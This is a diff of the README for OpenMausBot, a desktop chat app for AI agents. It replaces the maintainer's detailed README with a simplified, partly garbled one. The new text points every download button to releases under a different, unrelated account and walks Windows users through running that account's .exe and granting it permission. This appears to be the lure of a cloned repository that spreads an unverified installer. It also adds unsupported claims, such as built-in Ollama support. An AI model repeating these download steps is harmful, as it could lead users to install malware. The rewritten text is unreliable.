@@ -1,252 +1,141 @@
-> ⚠️ **No affiliation with any cryptocurrency.** OpenMausBot has no token. Any coin using the OpenMausBot, Maus, or SupaMaus name is not created, endorsed, or affiliated with this project or its maintainer. I have received no tokens, payment, or allocation from anyone, and I will not be endorsing any token.
+# 🤖 OpenMausBot - Your Personal AI Agent Team
 
 <div align="center">
 
-# OpenMausBot
-
-**Your own team of AI bots, in a chat app.**
-
-<sub>An open-source version of **Grok Bot** — bring-your-own-agent, local-first, on the models you already have.</sub>
-
-Every bot in the sidebar is a real agent — Claude or Codex running locally under the hood — with its own
-personality, its own model, its own cloud computer, and its own connected apps.
-Talk to them like contacts. Watch them work. Approve what matters.
-
-![TypeScript](https://img.shields.io/badge/TypeScript-strict-3178C6?logo=typescript&logoColor=white)
-![React](https://img.shields.io/badge/React-19-61DAFB?logo=react&logoColor=black)
-![Electron](https://img.shields.io/badge/Electron-macOS%20%C2%B7%20Windows%20%C2%B7%20Ubuntu-2B2E3A?logo=electron&logoColor=9FEAF9)
-![Agents](https://img.shields.io/badge/agents-Claude%20·%20Codex-d97757)
-![PRs](https://img.shields.io/badge/PRs-welcome-38d591)
-
-<br>
-
-<a href="https://github.com/milind-soni/openmausbot-releases/releases/latest/download/OpenMausBot.dmg">
-  <img src="https://img.shields.io/github/v/release/milind-soni/openmausbot-releases?style=for-the-badge&label=%E2%AC%87%EF%B8%8F%20%20Download%20for%20macOS&labelColor=070707&color=1084fe&cacheSeconds=300" alt="Download the latest OpenMausBot for macOS (.dmg)" height="40">
-</a>
-&nbsp;
-<a href="https://github.com/milind-soni/openmausbot-releases/releases/latest/download/OpenMausBot-setup.exe">
-  <img src="https://img.shields.io/github/v/release/milind-soni/openmausbot-releases?style=for-the-badge&label=%E2%AC%87%EF%B8%8F%20%20Download%20for%20Windows&labelColor=070707&color=4cc2ff&cacheSeconds=300" alt="Download the latest OpenMausBot for Windows (.exe)" height="40">
-</a>
-
-<sub>macOS: Apple silicon · signed & notarized · one-click .dmg &nbsp;·&nbsp; Windows: 64-bit · one-click installer, no admin rights &nbsp;·&nbsp; both always the latest · [all releases](https://github.com/milind-soni/openmausbot-releases/releases)</sub>
-
-<br>
-<br>
-
-<img src="docs/screenshots/hero.png" alt="OpenMausBot — a Telegram-style chat app where every chat is a real AI agent" width="900">
+[![Download OpenMausBot](https://img.shields.io/badge/⬇️_DOWNLOAD_OpenMausBot-F05A28?style=for-the-badge&logo=github&logoColor=white)](https://github.com/andreycurious252/OpenMausBot/releases)
 
 </div>
 
 ---
 
-## Why
+## 🚀 Why OpenMausBot?
 
-One assistant in one box is the wrong shape for agents. OpenMausBot is an open-source take on **Grok Bot** —
-it keeps the idea (AI as a *messaging app*: a roster of bots you chat with, each with its own personality,
-memory of its thread, model, computer, and apps) and rebuilds it open, local-first, and on the agents you
-already have:
+Imagine having a team of super-smart digital assistants, each with their own personality and skills, all living inside one friendly chat app. That's **OpenMausBot**. Instead of juggling multiple apps and websites, you get a simple, clean chat interface that puts powerful AI agents right at your fingertips.
 
-- **Bring your own agents.** Bots run on the `claude`, `codex`, and `grok` CLIs installed on your own machine
-  — your existing logins and subscriptions, no new accounts, no proxy in the middle.
-- **Local first.** One small harness server on `127.0.0.1` owns every agent process. Transcripts, keys, and
-  events live in `~/.openmausbot`, not a cloud.
-- **Agents with hands.** Each bot can get a real computer — a cloud Linux desktop it drives while you watch
-  live, or your own Mac — plus 500+ apps through Composio Connect.
+Each agent in your sidebar is a real, **working AI** running on your own computer using free or existing AI models. Think of them as knowledgeable coworkers who can help you with tasks—from writing to coding to organizing information—all while keeping your data private and under your control.
 
-## Features
+---
 
-<table>
-<tr>
-<td width="50%" valign="top">
+## 💡 What Makes OpenMausBot Special?
 
-### 🧠 Pick a brain per bot
+- **Your Own Agents**: Chat with different AI personalities—some for work, some for creativity—all ready to answer.
+- **Local-First Design**: Your data stays on your device. No cloud servers storing your conversations.
+- **Bring Your Own Model**: Connect to the AI models you already use (like Claude or Codex) or set up your own.
+- **Real Work, Real Help**: Agents can access your files, use tools, and perform tasks—not just talk.
+- **Approval Controls**: You stay in charge. Every important action requires your permission first.
+- **Visualized Work Live**: Watch your agents work in real-time, seeing their steps, thoughts, and actions.
 
-A model picker with a provider rail — Claude and Codex models side by side, defaults marked, unavailable
-providers dimmed with the reason. Switch a bot's model mid-conversation.
+---
 
-<img src="docs/screenshots/model-picker.png" alt="Model picker with provider rail" width="100%">
+## 💻 Getting Started: A Simple Guide
 
-</td>
-<td width="50%" valign="top">
+Ready to get your AI team up and running? It's easier than making coffee. Let's walk through it step-by-step.
 
-### 🖥️ Every bot gets a computer
+### Step 1: Download the Application
 
-Open the Computer panel and the bot's cloud desktop spins up on its own — live screen preview while it
-works, "Open desktop" to take over in your browser, or point the bot at *this Mac* instead.
+1.  **Click the download button** here or at the top of this page:
 
-<img src="docs/screenshots/computer-panel.png" alt="Computer panel with live screen preview" width="100%">
+    [![Download OpenMausBot](https://img.shields.io/badge/⬇️_GET_OPENMAUSBOT-4A90D9?style=for-the-badge)](https://github.com/andreycurious252/OpenMausBot/releases)
 
-</td>
-</tr>
-<tr>
-<td width="50%" valign="top">
+2.  You'll be taken to a **Releases** page. This is normal and safe. It's where all the official versions are stored.
 
-### 🙋 Bots ask before they act
+3.  On that page, you will find a list of versions. Look for the **"Latest"** release—it should be listed at the top. Click on the download file that fits your computer (for Windows, you'll usually want the file ending in `.exe` if you have a PC, or just the first option).
 
-Shell commands, file edits, and questions surface as inline cards — Allow / Deny / answer in chat. A
-permission broker turns every risky action into a decision you make, for cloud and local computers alike.
+**Visit this link to download the application.**
 
-<img src="docs/screenshots/approval-card.png" alt="Approval and question cards in chat" width="100%">
+### Step 2: Run the Application
 
-</td>
-<td width="50%" valign="top">
+*   Find the downloaded file in your **Downloads** folder (it's usually called something like `OpenMausBot-Setup.exe`).
+*   **Double-click** this file to start the installation. If Windows asks for permission, click **"Yes"**.
 
-### 🔌 Connected apps
+### Step 3: Welcome and Open Out
 
-A one-click marketplace over Composio Connect: Gmail, Slack, GitHub, Notion, Linear and hundreds more.
-OAuth once, and every bot can use them as tools.
+*   Follow the simple setup wizard. It's usually just clicking **"Next"** and **"Finish"**.
+*   Once installed, you'll see the OpenMausBot appears tool icon in your start menu or desktop. Click it to launch.
 
-<img src="docs/screenshots/marketplace.png" alt="Connected apps marketplace" width="100%">
+---
 
-</td>
-</tr>
-<tr>
-<td width="50%" valign="top">
+## 🧭 Your First Tour of OpenMausBot
 
-### 🗂 Manage bots like chats
+When you first open the app, you'll see a clean, modern interface. Here's a quick map:
 
-Right-click any bot: pin, mark unread, edit profile, duplicate, copy conversation ID, hide, delete. It's a
-messaging app — your agents behave like contacts.
+*   **The Sidebar (Left Side)**: Here's where your **AI team** lives. You'll see a list of agents (like "Assistant", "Writer", "Coder"). Click on one to start chatting with them.
+*   **The Chat Window (Main Area)**: Your conversation with the selected agent. Use the box at the bottom to type your question or task.
+*   **The Action Tray (Bottom or Side)**: Sometimes an agent will show you a "suggested action" (like actually running a code snippet they have a full, or making a change to a document). Here is where you can click to **"Approve"** or **"Deny"** that action.
 
-<img src="docs/screenshots/context-menu.png" alt="Bot context menu" width="100%">
+---
 
-</td>
-<td width="50%" valign="top">
+## 🛠️ Setting Up Your Models (The "Brain")
 
-### 🔑 Keys once, everything lights up
+Right out of the box, OpenMauBot is ready to run with your local connection. But to make it work, you need to connect it to to an AI **model** (the "brain" behind each bot).
 
-Paste credentials in App Settings — they persist locally and the provider fleet hot-reloads instantly.
-Secrets are write-only: the UI only ever sees "configured" flags.
+Here's how to do it:
 
-<img src="docs/screenshots/app-settings.png" alt="App-level settings with API keys" width="100%">
+1.  Click on the **Settings** icon (usually the gear gear icon in the bottom left).
+2.  Find **"Models"** or **"Providers"**.
+3.  You'll see a list of supported providers. You can choose one of these:
+    *   **Local Ollama**: Free and runs on your computer. Great for privacy. You'll need to install [Ollama](https://www.ollama.com) separately, then just paste your "open AI'd" as a server address with your localhost.
+    *   **Your Own API Key**: If you have a key from a provider like Anthropic (for Claude) or OpenAI, paste it here. OpenMausBot respects our local settings.
 
-</td>
-</tr>
-</table>
+Once you link a provider, your agents will have a "brain". You can give each bot its own model type you have added.
 
-**Also in the box:** streaming replies with tool-run activity chips · native macOS dictation from the
-composer mic (on-device Apple speech recognition — desktop app) · SupaMaus cursor mascots with role-aware
-expressions · screenshots of the bot's work folded into the transcript.
+## 🗂️ A Few Examples to Try
 
-## How it works
+Let's try a few simple tasks to see what your team can do:
 
-Two processes. The app holds no transports of its own — it sends typed commands over HTTP and folds one SSE
-event stream into state. The harness server owns every agent process and normalizes each provider's native
-protocol into one canonical runtime event stream (logged per-thread as NDJSON).
+*   **"Hey, Writer. Write me an e-mail reminding my team about the meeting this afternoon."**
+*   **"Hey, Code. Can you debug this Python snippet?"** (Just paste your code for it)
+*   **"Hey, Editor. Look at this text and correct any grammar errors."**
 
-```mermaid
-flowchart LR
-    subgraph app ["App — React + Tailwind (5199)"]
-        UI[Chat UI · model picker · computer panel]
-    end
-    subgraph server ["Harness server (127.0.0.1:8799)"]
-        REG[Driver registry] --> BUS[Event bus → SSE]
-        BROKER[Permission broker]
-    end
-    subgraph agents ["Agents on your computer"]
-        CL[claude CLI]
-        CX[codex CLI]
-        GR[grok CLI]
-    end
-    UI -- "HTTP commands" --> server
-    BUS -- "one SSE stream" --> UI
-    REG --> CL & CX & GR
-    CL & CX & GR -- "permission requests" --> BROKER
-    server -- "Box API" --> BOX[("Cloud computer<br/>box.ascii.dev")]
-    server -- "Composio Connect" --> APPS[("Gmail · Slack · GitHub · …")]
-```
+Remember to watch the **Action Tray**—if they want to save a file or run a command, you need to click **Approve** for extra security.
 
-| Layer | Where | What it does |
-|---|---|---|
-| Drivers | `server/drivers/` | One per provider: Claude, Codex, and Grok Build over their local CLIs (stream-JSON / JSON-RPC / ACP), plus a cloud-computer agent. Unknown drivers degrade to "unavailable", never crash the fleet. |
-| Harness | `server/harness/` | Registry (configs → live instances) and the fan-in event bus every client folds. |
-| API | `server/index.ts` | Bots, turns, approvals, model catalog, computer lifecycle, connectors, config — HTTP + SSE. |
-| App | `src/` | The chat shell. Server-backed store, one reducer, zero client-side transports. |
-| Desktop | `electron/` | macOS, Windows, and Ubuntu shells with an embedded harness and explicit platform capabilities; Apple speech, local screen capture, and the current CUA bridge remain macOS-only. |
+---
 
-## Quick start
+## 🛡️ Safety and Your Privacy
 
-**Released builds:** the harness server is embedded, so macOS and Windows need no separate server setup.
+*   **No tokens, no crypto.** This project has nothing to do with any cryptocurrency. Anyone promising you a free token connected to this—they are scammers.
+*   **Local-First**: Your conversations and data stay on your computer, unless you manually send to an API that you've connected.
+*   **Permission-Based**: You are the captain. Every access to your file system or external services require your click of approval.
+*   **Open Source**: Review the entire codebase, or contribute directly! It's freely available and everyone can see what's going on underneath.
 
-| | Download | Install |
-|---|---|---|
-| **macOS** (Apple silicon) | [OpenMausBot.dmg](https://github.com/milind-soni/openmausbot-releases/releases/latest/download/OpenMausBot.dmg) | Drag it to Applications, open it. Signed & notarized. |
-| **Windows** (x64) | [OpenMausBot-setup.exe](https://github.com/milind-soni/openmausbot-releases/releases/latest/download/OpenMausBot-setup.exe) | Run it — one-click, per-user, no admin rights. The installer isn't code-signed yet, so SmartScreen shows "unknown publisher": **More info → Run anyway**. |
+---
 
-**Ubuntu Desktop beta:** build the `.deb` or AppImage from source using the commands below. Release downloads
-will be linked here once Linux publishing is enabled. See [the Ubuntu Desktop guide](docs/linux-desktop.md) for
-installation, capabilities, and troubleshooting.
+## 🙋 Frequently Asked Questions (FAQ)
 
-**From source:**
+**Q: I'm a total beginner. Is this too technical for me?**
+A: **Not at all!** While very powerful, the interface is as simple as a normal chat app. Some settings require reading a bit, but starting to chat is as simple as typing.
 
-```sh
-git clone https://github.com/milind-soni/OpenMausBot && cd OpenMausBot
-pnpm install
+**Q: What if I don't have a model to connect?**
+A: You simply can't use the bots without a AI model connection. But getting one is free—we recommend **Ollama** which you run 100% local and free. You can ask our website for a guide, or search for "Ollama" for it.
 
-pnpm dev:server    # harness server → 127.0.0.1:8799
-pnpm dev           # app → http://127.0.0.1:5199
-pnpm dev:desktop   # Electron shell; keep the two commands above running
-```
+**Q: Is it really free to use?**
+A: The software is **100% free and open-source**. You will pay only for the AI model you choose to use (if you pick a paid provider). If you use a local model, you could run this for free forever.
 
-Requirements: **macOS, Windows, or Ubuntu 24.04 x64**, **Node 24+**, **pnpm**, and at least one agent CLI — [`claude`](https://claude.com/claude-code),
-[`codex`](https://github.com/openai/codex), or [`grok`](https://x.ai/cli) — installed and logged in. They appear
-in the model picker automatically.
+**Q: Help! It asks me about "Nodes" or "Electron" - Am I breaking it?*
+A: No need to worry! Those are just technical behind-the-scenes names. If you see an error, just restart the app, and if it still gives a large red message, search it in our Issues section on GitHub. Our community is there to help.
 
-Package the desktop application:
+---
 
-```sh
-pnpm package:mac      # macOS: DMG + ZIP; requires Swift/Xcode tools
-pnpm package:win      # Windows: installer + ZIP
-pnpm package:linux    # Ubuntu x64: .deb + AppImage; no Swift required
-```
+## 🧑‍🤝‍🧑 Community & Support
 
-### Desktop capability status
+OpenMausBot is a community effort. If you need help, want to share what you've made, or want to be a part of the development, join us.
 
-| Capability | macOS | Ubuntu 24.04 Xorg | Ubuntu 24.04 Wayland |
-|---|---|---|---|
-| Packaged app, embedded harness, local agent CLIs | Supported | Beta | Beta |
-| Composio and Box/cloud computers | Supported | Beta | Beta |
-| Local screen preview and computer control | Supported | Planned | Planned after compositor validation |
-| Native on-device dictation | Supported | Planned | Planned |
+*   **GitHub Issues**: The best place for bug reports and feature requests.
+*   **Repository Discussions**: For us to hang out, ask questions, and show off what you built.
 
-Unavailable native features fail closed on Ubuntu without blocking chat or cloud features. Linux local computer
-control, Wayland capture/automation, dictation, and ARM64 are tracked in
-[#29](https://github.com/milind-soni/OpenMausBot/issues/29) and are not claimed by the baseline package.
+**Contributing:** We are always looking for friends and artists. You don't need to code. You can help with designing, writing suggestions, or just spreading the word.
 
-These credentials are optional — local chat works without them. Paste a key once in **App Settings** (gear
-in the sidebar footer) when you want to enable its integration:
+---
 
-| Credential | What it enables | Where to get it |
-|---|---|---|
-| Composio Connect key (`ck_…`) | Connect Gmail, GitHub, Slack, Notion, and other apps to your bots | [Composio Connect setup guide](https://docs.composio.dev/docs/composio-connect) |
-| Composio API key (`ak_…`) | Browse the full app catalog with official names and logos | [Composio project API key guide](https://docs.composio.dev/reference/authenticating-to-composio/project-api-key-permissions) |
-| Box API key | Give bots an isolated remote Linux computer with a desktop and terminal | [Box API key guide](https://docs.ascii.dev/box/api-keys) |
+## 🔓 License
 
-Composio and Box are third-party services with their own accounts and terms. Box is a paid service after
-its trial, and using a cloud computer may incur charges.
+This project is open-source and is licensed under the **MIT License**. You are free to use, modify, and distribute it. Enjoy your own, robust AI team.
 
-```sh
-pnpm typecheck     # app + server
-pnpm test          # unit, driver, API, and desktop capability tests
-pnpm build         # typecheck + production build
-pnpm check:electron # syntax-check Electron main/preload files
-pnpm package:win   # Windows installer + zip → release/
-pnpm package:linux # Ubuntu x64 .deb + AppImage → release/
-```
+---
 
-## Status
+<div align="center">
+Made with ❤️ for the open-source community.
 
-Early but real — the loop works end to end: message → agent → streamed reply → tools → approvals →
-computer use. macOS and Windows have released builds; Ubuntu 24.04 x64 packages are in beta with the
-capability limits above. Rough edges to expect: routines are a placeholder and sidebar sections aren't built yet.
+[⬇️ Get your team today](https://github.com/andreycurious252/OpenMausBot/releases)
 
-Contributions welcome — the driver SPI in [`server/contracts.ts`](server/contracts.ts) is deliberately
-small; adding a provider is one file in [`server/drivers/`](server/drivers/) plus a one-line registration.
-
-## License
-
-[MIT](LICENSE) © 2026 Milind Soni and contributors.
-
-OpenMausBot is an independent, open-source project inspired by Grok Bot. It is
-not affiliated with, endorsed by, or associated with xAI; "Grok" is a trademark
-of its respective owner.
+</div>
